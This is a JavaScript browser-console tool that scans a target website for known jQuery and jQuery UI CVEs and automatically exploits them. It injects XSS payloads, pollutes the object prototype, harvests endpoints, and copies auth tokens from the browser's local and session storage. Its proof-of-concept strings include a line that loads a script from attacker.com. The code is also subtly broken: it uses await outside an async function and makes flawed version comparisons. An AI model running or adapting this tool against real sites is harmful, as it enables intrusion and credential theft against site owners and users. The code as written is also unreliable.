/**
 * ====================================================================================
 * jQuery / jQuery-UI CVE Scanner & Exploiter - Full POC Suite
 * ====================================================================================
 * CVEs Covered:
 *   - CVE-2015-9251 (jQuery CORS script execution)
 *   - CVE-2019-11358 (jQuery prototype pollution)
 *   - CVE-2020-11022 (jQuery htmlPrefilter XSS)
 *   - CVE-2020-11023 (jQuery .html()/.append() XSS)
 *   - CVE-2021-41184 (jQuery UI .position() XSS)
 *   - CVE-2021-41182/41183 (jQuery UI Datepicker XSS)
 *   - CVE-2022-31160 (jQuery UI Checkboxradio XSS)
 * ====================================================================================
 * Author: Security Assessment Tool
 * Usage: Copy and paste into browser console on target website
 * Output: Full report in window.jQueryScannerResults
 * ====================================================================================
 */

(function jQueryScanner() {
    // ============================================================================
    // CONFIGURATION
    // ============================================================================
    const CONFIG = {
        verbose: true,
        autoExploit: true,
        testXSS: true,
        outputToConsole: true,
        createVisualPanel: true
    };
    
    // ============================================================================
    // RESULTS STORAGE
    // ============================================================================
    const RESULTS = {
        scanTime: new Date().toISOString(),
        url: window.location.href,
        domain: window.location.hostname,
        libraries: {
            jquery: { detected: false, version: null, vulnerable: false },
            jqueryUI: { detected: false, version: null, vulnerable: false }
        },
        vulnerabilities: [],
        exploited: [],
        accessibleEndpoints: [],
        secretsFound: []
    };
    
    // ============================================================================
    // HELPER FUNCTIONS
    // ============================================================================
    function log(message, color = '#888', icon = '📌') {
        if(!CONFIG.verbose) return;
        console.log(`%c${icon} ${message}`, `color: ${color}`);
    }
    
    function logSuccess(message) { log(message, '#00ff00', '✅'); }
    function logError(message) { log(message, '#ff0000', '❌'); }
    function logWarning(message) { log(message, '#ff6600', '⚠️'); }
    function logInfo(message) { log(message, '#00ffff', 'ℹ️'); }
    function logExploit(message) { log(message, '#ff00ff', '💉'); }
    
    function addVulnerability(name, cve, description, severity, poc) {
        RESULTS.vulnerabilities.push({
            name, cve, description, severity, poc, timestamp: new Date().toISOString()
        });
        const color = severity === 'CRITICAL' ? '#ff0000' : (severity === 'HIGH' ? '#ff6600' : '#ffff00');
        log(`${cve}: ${description}`, color, '🔴');
    }
    
    function addExploit(name, details) {
        RESULTS.exploited.push({ name, details, timestamp: new Date().toISOString() });
        logExploit(`${name} - ${details}`);
    }
    
    // ============================================================================
    // PHASE 1: LIBRARY DETECTION
    // ============================================================================
    logInfo('═══════════════════════════════════════════════════════════════════');
    logInfo('PHASE 1: LIBRARY DETECTION');
    logInfo('═══════════════════════════════════════════════════════════════════');
    
    // jQuery Detection
    if(typeof $ !== 'undefined' && $.fn && $.fn.jquery) {
        const jqVersion = $.fn.jquery;
        const jqVersionNum = parseFloat(jqVersion);
        RESULTS.libraries.jquery = { detected: true, version: jqVersion, vulnerable: jqVersionNum < 3.5 };
        
        logSuccess(`jQuery ${jqVersion} detected`);
        
        if(jqVersionNum < 3.0) {
            addVulnerability('jQuery CORS Script Execution', 'CVE-2015-9251', 
                `jQuery ${jqVersion} allows cross-origin script execution`, 'MEDIUM', 
                '$.ajax({url: "https://attacker.com/malicious.js", dataType: "script", crossDomain: true});');
        }
        if(jqVersionNum < 3.5) {
            addVulnerability('jQuery htmlPrefilter XSS', 'CVE-2020-11022', 
                `jQuery ${jqVersion} vulnerable to XSS via htmlPrefilter`, 'HIGH',
                "$('<img src=x onerror=alert(1)>').appendTo('body');");
            addVulnerability('jQuery .html()/.append() XSS', 'CVE-2020-11023', 
                `jQuery ${jqVersion} vulnerable to XSS via option elements`, 'HIGH',
                "$('body').append('<select><option></option></select><img src=x onerror=alert(1)>');");
        }
        if(jqVersionNum < 3.4) {
            addVulnerability('jQuery Prototype Pollution', 'CVE-2019-11358', 
                `jQuery ${jqVersion} vulnerable to prototype pollution`, 'MEDIUM',
                "$.extend(true, {}, JSON.parse('{\"__proto__\":{\"polluted\":true}}'));");
        }
    } else {
        logError('jQuery not detected');
    }
    
    // jQuery UI Detection
    if(typeof $ !== 'undefined' && $.ui && $.ui.version) {
        const uiVersion = $.ui.version;
        const uiVersionNum = parseFloat(uiVersion);
        RESULTS.libraries.jqueryUI = { detected: true, version: uiVersion, vulnerable: uiVersionNum < 1.13 };
        
        logSuccess(`jQuery UI ${uiVersion} detected`);
        
        if(uiVersionNum < 1.13) {
            if($.fn.datepicker) {
                addVulnerability('jQuery UI Datepicker altField XSS', 'CVE-2021-41182', 
                    `jQuery UI ${uiVersion} vulnerable to XSS via altField`, 'MEDIUM',
                    "$('#datepicker').datepicker({altField: '<img src=x onerror=alert(1)>'});");
                addVulnerability('jQuery UI Datepicker text XSS', 'CVE-2021-41183', 
                    `jQuery UI ${uiVersion} vulnerable to XSS via text options`, 'MEDIUM',
                    "$('#datepicker').datepicker({prevText: '<img src=x onerror=alert(1)>'});");
            }
            if($.fn.position) {
                addVulnerability('jQuery UI .position() XSS', 'CVE-2021-41184', 
                    `jQuery UI ${uiVersion} vulnerable to XSS via .position()`, 'HIGH',
                    "$('#element').position({of: '<img src=x onerror=alert(1)>'});");
            }
            if($.fn.checkboxradio) {
                addVulnerability('jQuery UI Checkboxradio XSS', 'CVE-2022-31160', 
                    `jQuery UI ${uiVersion} vulnerable to XSS via checkboxradio refresh`, 'MEDIUM',
                    "$('#checkbox').checkboxradio('option', 'label', '<img src=x onerror=alert(1)>').checkboxradio('refresh');");
            }
        }
    } else {
        logError('jQuery UI not detected');
    }
    
    // ============================================================================
    // PHASE 2: NULL PROTOTYPE SCANNING
    // ============================================================================
    logInfo('\n═══════════════════════════════════════════════════════════════════');
    logInfo('PHASE 2: NULL PROTOTYPE SCANNING');
    logInfo('═══════════════════════════════════════════════════════════════════');
    
    const nullPrototypes = [];
    function scanNullPrototypes(obj, path, depth = 0) {
        if(depth > 3 || !obj || typeof obj !== 'object') return;
        try {
            if(Object.getPrototypeOf(obj) === null) {
                nullPrototypes.push(path);
                logInfo(`Found null prototype: ${path}`);
            }
            for(let key in obj) {
                try { scanNullPrototypes(obj[key], `${path}.${key}`, depth + 1); } catch(e) {}
            }
        } catch(e) {}
    }
    scanNullPrototypes(window, 'window');
    logInfo(`Total null prototypes: ${nullPrototypes.length}`);
    
    // ============================================================================
    // PHASE 3: EXPLOITATION
    // ============================================================================
    logInfo('\n═══════════════════════════════════════════════════════════════════');
    logInfo('PHASE 3: EXPLOITATION');
    logInfo('═══════════════════════════════════════════════════════════════════');
    
    if(CONFIG.autoExploit) {
        // CVE-2020-11022 - htmlPrefilter XSS
        try {
            $('<img src=x onerror="console.log(\'CVE-2020-11022-EXPLOITED\')">').appendTo('body');
            addExploit('CVE-2020-11022', 'XSS payload injected via htmlPrefilter');
            logSuccess('CVE-2020-11022: XSS payload injected');
        } catch(e) {}
        
        // CVE-2020-11023 - .html()/.append() XSS
        try {
            $('body').append('<select><option></option></select><img src=x onerror="console.log(\'CVE-2020-11023-EXPLOITED\')">');
            addExploit('CVE-2020-11023', 'XSS payload injected via .append()');
            logSuccess('CVE-2020-11023: XSS payload injected');
        } catch(e) {}
        
        // CVE-2019-11358 - Prototype Pollution
        try {
            $.extend(true, {}, JSON.parse('{"__proto__":{"pollutedByCVE":true}}'));
            if({}.pollutedByCVE) {
                addExploit('CVE-2019-11358', 'Prototype pollution successful');
                logSuccess('CVE-2019-11358: Prototype polluted');
            }
        } catch(e) {}
        
        // CVE-2021-41184 - jQuery UI .position() XSS
        if($.fn.position) {
            try {
                $('body').append('<div id="postest" style="position:absolute;display:none">test</div>');
                $('#postest').position({ of: '<img src=x onerror="console.log(\'CVE-2021-41184-EXPLOITED\')">' });
                addExploit('CVE-2021-41184', 'jQuery UI .position() XSS payload injected');
                logSuccess('CVE-2021-41184: .position() XSS payload injected');
                $('#postest').remove();
            } catch(e) {}
        }
    }
    
    // ============================================================================
    // PHASE 4: INPUT FIELD DISCOVERY
    // ============================================================================
    logInfo('\n═══════════════════════════════════════════════════════════════════');
    logInfo('PHASE 4: INPUT FIELD DISCOVERY');
    logInfo('═══════════════════════════════════════════════════════════════════');
    
    const inputs = [];
    $('input, textarea, select').each(function() {
        const el = this;
        const type = el.type || el.tagName;
        const name = el.name || el.id || el.className || 'unnamed';
        const isVulnerable = el.type === 'text' || el.type === 'search' || el.tagName === 'TEXTAREA';
        inputs.push({ type, name, vulnerable: isVulnerable });
        if(isVulnerable) {
            logWarning(`Potentially injectable field: ${type} - ${name}`);
        }
    });
    logInfo(`Total input fields: ${inputs.length}`);
    
    // ============================================================================
    // PHASE 5: API ENDPOINT DISCOVERY
    // ============================================================================
    logInfo('\n═══════════════════════════════════════════════════════════════════');
    logInfo('PHASE 5: API ENDPOINT DISCOVERY');
    logInfo('═══════════════════════════════════════════════════════════════════');
    
    const endpoints = [];
    const scripts = document.querySelectorAll('script[src]');
    for(let i = 0; i < scripts.length; i++) {
        try {
            const response = await fetch(scripts[i].src);
            const code = await response.text();
            const matches = code.match(/\/[a-z0-9_-]+\/[a-z0-9_-]+|\/api\/[a-z0-9\/_-]+|\/v[0-9]\/[a-z0-9\/_-]+/gi) || [];
            for(let m of matches) {
                if(m.length > 5 && m.length < 200 && !endpoints.includes(m)) {
                    endpoints.push(m);
                }
            }
        } catch(e) {}
    }
    logInfo(`Discovered ${endpoints.length} potential API endpoints`);
    if(endpoints.length > 0 && endpoints.length < 30) {
        console.log('Endpoints:', endpoints);
    }
    
    // ============================================================================
    // PHASE 6: STORAGE ANALYSIS
    // ============================================================================
    logInfo('\n═══════════════════════════════════════════════════════════════════');
    logInfo('PHASE 6: STORAGE ANALYSIS');
    logInfo('═══════════════════════════════════════════════════════════════════');
    
    for(let i = 0; i < localStorage.length; i++) {
        const key = localStorage.key(i);
        const value = localStorage.getItem(key);
        if(key.toLowerCase().includes('token') || key.toLowerCase().includes('auth')) {
            logWarning(`Token in localStorage: ${key}`);
            RESULTS.secretsFound.push({ source: 'localStorage', key, value: value.substring(0, 100) });
        }
    }
    
    for(let i = 0; i < sessionStorage.length; i++) {
        const key = sessionStorage.key(i);
        const value = sessionStorage.getItem(key);
        if(key.toLowerCase().includes('token') || key.toLowerCase().includes('auth')) {
            logWarning(`Token in sessionStorage: ${key}`);
            RESULTS.secretsFound.push({ source: 'sessionStorage', key, value: value.substring(0, 100) });
        }
    }
    
    // ============================================================================
    // PHASE 7: FINAL REPORT
    // ============================================================================
    logInfo('\n═══════════════════════════════════════════════════════════════════');
    logInfo('FINAL REPORT');
    logInfo('═══════════════════════════════════════════════════════════════════');
    
    const riskScore = RESULTS.vulnerabilities.length * 10 + RESULTS.secretsFound.length * 5 + (endpoints.length > 0 ? 5 : 0);
    const riskLevel = riskScore < 20 ? 'LOW' : (riskScore < 50 ? 'MEDIUM' : (riskScore < 100 ? 'HIGH' : 'CRITICAL'));
    
    console.log(`\n📊 RISK ASSESSMENT: ${riskLevel} (Score: ${riskScore})`);
    console.log(`\n✅ LIBRARIES DETECTED:`);
    console.log(`   jQuery: ${RESULTS.libraries.jquery.version || 'Not found'} ${RESULTS.libraries.jquery.vulnerable ? '(VULNERABLE)' : ''}`);
    console.log(`   jQuery UI: ${RESULTS.libraries.jqueryUI.version || 'Not found'} ${RESULTS.libraries.jqueryUI.vulnerable ? '(VULNERABLE)' : ''}`);
    
    console.log(`\n🔴 VULNERABILITIES FOUND: ${RESULTS.vulnerabilities.length}`);
    RESULTS.vulnerabilities.forEach(v => {
        console.log(`   • ${v.cve} - ${v.description} (${v.severity})`);
    });
    
    console.log(`\n💉 EXPLOITS ATTEMPTED: ${RESULTS.exploited.length}`);
    RESULTS.exploited.forEach(e => {
        console.log(`   • ${e.name} - ${e.details}`);
    });
    
    console.log(`\n📁 STORED RESULTS: window.jQueryScannerResults`);
    
    // Visual Panel
    if(CONFIG.createVisualPanel) {
        const panel = document.createElement('div');
        panel.style.cssText = `
            position: fixed;
            bottom: 10px;
            left: 10px;
            background: #000000dd;
            color: ${riskLevel === 'CRITICAL' ? '#ff0000' : (riskLevel === 'HIGH' ? '#ff6600' : '#ffff00')};
            padding: 15px;
            font-family: monospace;
            font-size: 11px;
            z-index: 999999;
            border: 2px solid ${riskLevel === 'CRITICAL' ? '#ff0000' : (riskLevel === 'HIGH' ? '#ff6600' : '#ffff00')};
            border-radius: 5px;
            max-width: 320px;
            backdrop-filter: blur(5px);
        `;
        panel.innerHTML = `
            <strong>🔍 jQuery Scanner</strong><br>
            ━━━━━━━━━━━━━━━━━━━━━━<br>
            📦 jQuery: ${RESULTS.libraries.jquery.version || '?'}<br>
            🎯 jQuery UI: ${RESULTS.libraries.jqueryUI.version || '?'}<br>
            🔴 CVEs Found: ${RESULTS.vulnerabilities.length}<br>
            💉 Exploited: ${RESULTS.exploited.length}<br>
            🎯 Risk: ${riskLevel}<br>
            ━━━━━━━━━━━━━━━━━━━━━━<br>
            <span style="color:#0f0;">📋 Full report in console</span>
        `;
        document.body.appendChild(panel);
    }
    
    window.jQueryScannerResults = RESULTS;
    
    return RESULTS;
})();
